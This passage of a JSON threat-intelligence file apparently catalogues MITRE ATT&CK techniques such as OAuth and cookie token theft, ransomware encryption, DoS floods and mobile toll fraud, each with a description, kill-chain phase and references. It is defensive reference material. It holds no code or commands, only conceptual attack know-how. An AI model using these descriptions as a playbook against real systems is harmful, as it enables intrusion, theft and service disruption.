          "https://attack.mitre.org/techniques/T1234"
        ]
      },
      "uuid": "e754fa49-2db1-416b-92db-7f886decd099",
      "value": "Generate analyst intelligence requirements - T1234"
    },
    {
      "description": "Security defensive capabilities are designed to stop or limit unauthorized network traffic or other types of accesses. (Citation: OSFingerprinting2014) (Citation: NMAP WAF NSE)",
      "meta": {
        "external_id": "T1263",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1263"
        ]
      },
      "uuid": "04e93ca1-8415-4a46-8549-73b7c84f8dc3",
      "value": "Identify security defensive capabilities - T1263"
    },
    {
      "description": "A technique used by the adversary similar to Dynamic DNS with the exception that the use of multiple DNS infrastructures likely have whois records. (Citation: KrebsStLouisFed)",
      "meta": {
        "external_id": "T1327",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1327"
        ]
      },
      "uuid": "616238cb-990b-4c71-8f50-d8b10ed8ce6b",
      "value": "Use multiple DNS infrastructures - T1327"
    },
    {
      "description": "An adversary can probe a victim's network to determine configurations. The configurations may provide opportunities to route traffic through the network in an undetected or less detectable way. (Citation: Li2014ExploitKits) (Citation: RecurlyGHOST)",
      "meta": {
        "external_id": "T1293",
        "kill_chain": [
          "mitre-pre-attack:technical-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1293"
        ]
      },
      "uuid": "fe421ab9-c8f3-42f7-9ae1-5d6c324cc925",
      "value": "Analyze application security posture - T1293"
    },
    {
      "description": "As demonstrated by the XcodeGhost attack (Citation: PaloAlto-XcodeGhost1), app developers could be provided with modified versions of software development tools (e.g. compilers) that automatically inject malicious or exploitable code into applications.\n\nDetection: Enterprises could deploy integrity checking software to the computers that they use to develop code to detect presence of unauthorized, modified software development tools.\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1462",
        "refs": [
          "https://attack.mitre.org/techniques/T1462"
        ]
      },
      "related": [
        {
          "dest-uuid": "0d95940f-9583-4e0f-824c-a42c1be47fad",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "b928b94a-4966-4e2a-9e61-36505b896ebc",
      "value": "Malicious Software Development Tools - T1462"
    },
    {
      "description": "Technology usage patterns include identifying if users work offsite, connect remotely, or other possibly less restricted/secured access techniques. (Citation: SANSRemoteAccess)",
      "meta": {
        "external_id": "T1264",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1264"
        ]
      },
      "uuid": "194bff4f-c218-40df-bea3-1ace715de8dd",
      "value": "Identify technology usage patterns - T1264"
    },
    {
      "description": "An adversary could seek to generate fraudulent advertising revenue from mobile devices, for example by triggering automatic clicks of advertising links without user involvement.",
      "meta": {
        "external_id": "T1472",
        "kill_chain": [
          "mitre-mobile-attack:impact"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1472"
        ]
      },
      "uuid": "f981d199-2720-467e-9dc9-eea04dbe05cf",
      "value": "Generate Fraudulent Advertising Revenue - T1472"
    },
    {
      "description": "An adversary may identify sensitive personnel information not typically posted on a social media site, such as address, marital status, financial history, and law enforcement infractions. This could be conducted by searching public records that are frequently available for free or at a low cost online. (Citation: RSA-APTRecon)",
      "meta": {
        "external_id": "T1274",
        "kill_chain": [
          "mitre-pre-attack:people-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1274"
        ]
      },
      "uuid": "7dae871c-effc-444b-9962-4b7efefe7d40",
      "value": "Identify sensitive personnel information - T1274"
    },
    {
      "description": "An adversary can attempt to identify web defensive services as [CloudFlare](https://www.cloudflare.com), [IPBan](https://github.com/jjxtra/Windows-IP-Ban-Service), and [Snort](https://www.snort.org). This may be done by passively detecting services, like [CloudFlare](https://www.cloudflare.com) routing, or actively, such as by purposefully tripping security defenses. (Citation: NMAP WAF NSE)",
      "meta": {
        "external_id": "T1256",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1256"
        ]
      },
      "uuid": "288b3cc3-f4da-4250-ab8c-d8b5dbed94ca",
      "value": "Identify web defensive services - T1256"
    },
    {
      "description": "Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering and typically requires user action to grant access.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a link through [Spearphishing Link](https://attack.mitre.org/techniques/T1192) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1527).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nAdversaries have been seen targeting Gmail, Microsoft Outlook, and Yahoo Mail users.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017)",
      "meta": {
        "external_id": "T1528",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "Azure activity logs",
          "OAuth audit logs"
        ],
        "mitre_platforms": [
          "SaaS",
          "Office 365",
          "Azure AD"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1528",
          "https://auth0.com/docs/api-auth/why-use-access-tokens-to-secure-apis",
          "https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-v2-protocols",
          "https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow",
          "https://docs.microsoft.com/en-us/azure/active-directory/develop/quickstart-register-app",
          "https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens",
          "https://www.amnesty.org/en/latest/research/2019/08/evolving-phishing-attacks-targeting-journalists-and-human-rights-defenders-from-the-middle-east-and-north-africa/",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks"
        ]
      },
      "uuid": "890c9858-598c-401d-a4d5-c67ebcdd703a",
      "value": "Steal Application Access Token - T1528"
    },
    {
      "description": "The attempt to identify people of interest or with an inherent weakness for direct or indirect targeting to determine an approach to compromise a person or organization.  Such targets may include individuals with poor OPSEC practices or those who have a trusted relationship with the intended target. (Citation: RSA-APTRecon) (Citation: Scasny2015)",
      "meta": {
        "external_id": "T1269",
        "kill_chain": [
          "mitre-pre-attack:people-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1269"
        ]
      },
      "uuid": "0c0f075b-5d69-43f2-90df-d9ad18f44624",
      "value": "Identify people of interest - T1269"
    },
    {
      "description": "Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system.\n\nLocal system data includes information stored by the operating system. Access to local system data often requires escalated privileges (e.g. root access). Examples of local system data include authentication tokens, the device keyboard cache, Wi-Fi passwords, and photos.",
      "meta": {
        "external_id": "T1533",
        "kill_chain": [
          "mitre-mobile-attack:collection"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1533"
        ]
      },
      "uuid": "e1c912a9-e305-434b-9172-8a6ce3ec9c4a",
      "value": "Data from Local System - T1533"
    },
    {
      "description": "After compromise, an adversary may utilize additional tools to facilitate their end goals. This may include tools to further explore the system, move laterally within a network, exfiltrate data, or destroy data. (Citation: SofacyHits)",
      "meta": {
        "external_id": "T1353",
        "kill_chain": [
          "mitre-pre-attack:build-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1353"
        ]
      },
      "uuid": "df42286d-dfbd-4455-bc9d-aef52ac29aa7",
      "value": "Post compromise tool development - T1353"
    },
    {
      "description": "Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic.\n\nIn the mobile environment, the Google Cloud Messaging (GCM; two-way) and Apple Push Notification Service (APNS; one-way server-to-device) are commonly used protocols on Android and iOS respectively that would blend in with routine device traffic and are difficult for enterprises to inspect. Google reportedly responds to reports of abuse by blocking access to GCM.(Citation: Kaspersky-MobileMalware)",
      "meta": {
        "external_id": "APP-29",
        "kill_chain": [
          "mitre-mobile-attack:command-and-control",
          "mitre-mobile-attack:exfiltration"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1437",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-29.html",
          "https://securelist.com/mobile-malware-evolution-2013/58335/"
        ]
      },
      "uuid": "6a3f6490-9c44-40de-b059-e5940f246673",
      "value": "Standard Application Layer Protocol - T1437"
    },
    {
      "description": "An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. The adversary may use or modify existing exploits when those exploits are still relevant to the environment they are trying to compromise. (Citation: NYTStuxnet) (Citation: NationsBuying)",
      "meta": {
        "external_id": "T1349",
        "kill_chain": [
          "mitre-pre-attack:build-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1349"
        ]
      },
      "uuid": "4886e3c2-468b-4e26-b7e5-2031d995d13a",
      "value": "Build or acquire exploits - T1349"
    },
    {
      "description": "Use of removable media as part of the Launch phase requires an adversary to determine type, format, and content of the media and associated malware. (Citation: BadUSB)",
      "meta": {
        "external_id": "T1355",
        "kill_chain": [
          "mitre-pre-attack:build-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1355"
        ]
      },
      "uuid": "eacadff4-164b-451c-bacc-7b29ebfd0c3f",
      "value": "Create infected removable media - T1355"
    },
    {
      "description": "An adversary may steal web application or service session cookies and use them to gain access web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Mauraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1506) technique to login to the corresponding web application.",
      "meta": {
        "external_id": "T1539",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "API monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "Office 365",
          "SaaS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1539",
          "https://wunderwuzzi23.github.io/blog/passthecookie.html",
          "https://securelist.com/project-tajmahal/90240/",
          "https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/",
          "https://github.com/kgretzky/evilginx2",
          "https://github.com/muraenateam/muraena"
        ]
      },
      "uuid": "10ffac09-e42d-4f56-ab20-db94c67d76ff",
      "value": "Steal Web Session Cookie - T1539"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nSending messages through social media platforms to individuals identified as a target. These messages may include malicious attachments or links to malicious sites or they may be designed to establish communications for future actions. (Citation: APT1) (Citation: Nemucod Facebook)",
      "meta": {
        "external_id": "T1366",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1366"
        ]
      },
      "uuid": "eb517589-eefc-480e-b8e3-7a8b1066f6f1",
      "value": "Targeted social media phishing - T1366"
    },
    {
      "description": "If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device's Trusted Execution Environment (TEE) or other similar isolated execution environment where the code can evade detection, may persist after device resets, and may not be removable by the device user. Running code within the TEE may provide an adversary with the ability to monitor or tamper with overall device behavior.(Citation: Roth-Rootkits)",
      "meta": {
        "external_id": "APP-27",
        "kill_chain": [
          "mitre-mobile-attack:defense-evasion",
          "mitre-mobile-attack:persistence"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1399",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-27.html",
          "https://hackinparis.com/data/slides/2013/Slidesthomasroth.pdf",
          "https://www.apple.com/business/docs/iOS_Security_Guide.pdf"
        ]
      },
      "uuid": "f1c3d071-0c24-483d-aca0-e8b8496ce468",
      "value": "Modify Trusted Execution Environment - T1399"
    },
    {
      "description": "An adversary could distribute developed malware by masquerading the malware as a legitimate application. This can be done in two different ways: by embedding the malware in a legitimate application, or by pretending to be a legitimate application.\n\nEmbedding the malware in a legitimate application is done by downloading the application, disassembling it, adding the malicious code, and then re-assembling it.(Citation: Zhou) The app would appear to be the original app, but would contain additional malicious functionality. The adversary could then publish the malicious application to app stores or use another delivery method.\n\nPretending to be a legitimate application relies heavily on lack of scrutinization by the user. Typically, a malicious app pretending to be a legitimate one will have many similar details as the legitimate one, such as name, icon, and description.(Citation: Palo Alto HenBox)",
      "meta": {
        "external_id": "APP-14",
        "kill_chain": [
          "mitre-mobile-attack:initial-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1444",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-31.html",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-14.html",
          "http://ieeexplore.ieee.org/document/6234407",
          "https://unit42.paloaltonetworks.com/unit42-henbox-chickens-come-home-roost/"
        ]
      },
      "uuid": "a93ccb8f-3996-42e2-b7c7-bb599d4e205f",
      "value": "Masquerade as Legitimate Application - T1444"
    },
    {
      "description": "A malicious app could use standard Android APIs to send SMS messages. SMS messages could potentially be sent to premium numbers that charge the device owner and generate revenue for an adversary(Citation: Lookout-SMS).\n\nOn iOS, apps cannot send SMS messages.\n\nOn Android, apps must hold the SEND_SMS permission to send SMS messages. Additionally, Android version 4.2 and above has mitigations against this threat by requiring user consent before allowing SMS messages to be sent to premium numbers (Citation: AndroidSecurity2014).",
      "meta": {
        "external_id": "T1448",
        "kill_chain": [
          "mitre-mobile-attack:impact"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1448",
          "https://blog.lookout.com/10-organizations-build-60-of-russian-toll-fraud-malware",
          "https://static.googleusercontent.com/media/source.android.com/en//security/reports/Google_Android_Security_2014_Report_Final.pdf"
        ]
      },
      "uuid": "8f0e39c6-82c9-41ec-9f93-5696c0f2e274",
      "value": "Premium SMS Toll Fraud - T1448"
    },
    {
      "description": "An adversary could cause the mobile device to use less secure protocols, for example by jamming frequencies used by newer protocols such as LTE and only allowing older protocols such as GSM to communicate(Citation: NIST-SP800187). Use of less secure protocols may make communication easier to eavesdrop upon or manipulate.",
      "meta": {
        "external_id": "CEL-3",
        "kill_chain": [
          "mitre-mobile-attack:network-effects"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1466",
          "https://pages.nist.gov/mobile-threat-catalogue/cellular-threats/CEL-3.html",
          "http://csrc.nist.gov/publications/drafts/800-187/sp800_187_draft.pdf"
        ]
      },
      "uuid": "f58cd69a-e548-478b-9248-8a9af881dc34",
      "value": "Downgrade to Insecure Protocols - T1466"
    },
    {
      "description": "An adversary could set up a rogue cellular base station and then use it to eavesdrop on or manipulate cellular device communication. A compromised cellular femtocell could be used to carry out this technique(Citation: Computerworld-Femtocell).",
      "meta": {
        "external_id": "CEL-7",
        "kill_chain": [
          "mitre-mobile-attack:network-effects"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1467",
          "https://pages.nist.gov/mobile-threat-catalogue/cellular-threats/CEL-7.html",
          "http://www.computerworld.com/article/2484538/cybercrime-hacking/researchers-exploit-cellular-tech-flaws-to-intercept-phone-calls.html"
        ]
      },
      "uuid": "a5de0540-73e7-4c67-96da-4143afedc7ed",
      "value": "Rogue Cellular Base Station - T1467"
    },
    {
      "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018) In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017)\n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)",
      "meta": {
        "external_id": "T1486",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Kernel drivers",
          "File monitoring",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1486",
          "https://www.us-cert.gov/ncas/alerts/TA16-091A",
          "https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html",
          "https://www.us-cert.gov/ncas/alerts/TA17-181A",
          "https://www.us-cert.gov/ncas/alerts/AA18-337A"
        ]
      },
      "uuid": "b80d107d-fa0d-4b60-9684-b0433e8bdba0",
      "value": "Data Encrypted for Impact - T1486"
    },
    {
      "description": "The mobile device may be targeted for exploitation through its interface to cellular networks or other radio interfaces.\n\n### Baseband Vulnerability Exploitation\n\nA message sent over a radio interface (typically cellular, but potentially Bluetooth, GPS, NFC, Wi-Fi(Citation: ProjectZero-BroadcomWiFi) or other) to the mobile device could exploit a vulnerability in code running on the device(Citation: Register-BaseStation)(Citation: Weinmann-Baseband).\n\n### Malicious SMS Message\n\nAn SMS message could contain content designed to exploit vulnerabilities in the SMS parser on the receiving device(Citation: Forbes-iPhoneSMS). An SMS message could also contain a link to a web site containing malicious content designed to exploit the device web browser. Vulnerable SIM cards may be remotely exploited and reprogrammed via SMS messages(Citation: SRLabs-SIMCard).",
      "meta": {
        "external_id": "T1477",
        "kill_chain": [
          "mitre-mobile-attack:initial-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1477",
          "https://googleprojectzero.blogspot.com/2017/04/over-air-exploiting-broadcoms-wi-fi_4.html",
          "http://www.theregister.co.uk/2015/11/12/mobile_pwn2own1/",
          "https://www.usenix.org/system/files/conference/woot12/woot12-final24.pdf",
          "http://www.forbes.com/2009/07/28/hackers-iphone-apple-technology-security-hackers.html",
          "https://srlabs.de/bites/rooting-sim-cards/"
        ]
      },
      "uuid": "2d646840-f6f5-4619-a5a8-29c8316bbac5",
      "value": "Exploit via Radio Interfaces - T1477"
    },
    {
      "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS). Many different methods to accomplish such network saturation have been observed, but most fall into two main categories: Direct Network Floods and Reflection Amplification.\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).\n\n###Direct Network Flood###\n\nDirect Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for Direct Network Floods. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\n###Reflection Amplification###\n\nAdversaries may amplify the volume of their attack traffic by using Reflection. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflector may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017)\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)",
      "meta": {
        "external_id": "T1498",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Sensor health and status",
          "Network protocol analysis",
          "Netflow/Enclave netflow",
          "Network intrusion detection system",
          "Network device logs"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1498",
          "https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html",
          "https://www.ic3.gov/media/2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf",
          "https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf",
          "https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged",
          "https://blog.cloudflare.com/reflections-on-reflections/",
          "https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/",
          "https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/",
          "https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf",
          "https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/",
          "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf"
        ]
      },
      "uuid": "d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
      "value": "Network Denial of Service - T1498"
    },
    {
      "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see the Network Denial of Service Technique [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n\n### OS Exhaustion Flood\nSince operating systems (OSs) are responsible for managing the finite resources on a system, they can be a target for DoS. These attacks do not need to exhaust the actual resources on a system since they can simply exhaust the limits that an OS self-imposes to prevent the entire system from being overwhelmed by excessive demands on its capacity. Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018)\n\n#### SYN Flood\nWith SYN floods excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\n#### ACK Flood\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)\n\n### Service Exhaustion Flood\nDifferent network services provided by systems are targeted in different ways to conduct a DoS. Adversaries often target DNS and web servers, but other services have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\n#### Simple HTTP Flood\nA large number of HTTP requests can be issued to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)\n\n#### SSL Renegotiation Attack\nSSL Renegotiation Attacks take advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)\n\n### Application Exhaustion Flood\nWeb applications that sit on top of web server stacks can be targeted for DoS. Specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)\n\n### Application or System Exploitation\nSoftware vulnerabilities exist that when exploited can cause an application or system to crash and deny availability to users.(Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent DoS condition.",
      "meta": {
        "external_id": "CAPEC-125",
        "kill_chain": [
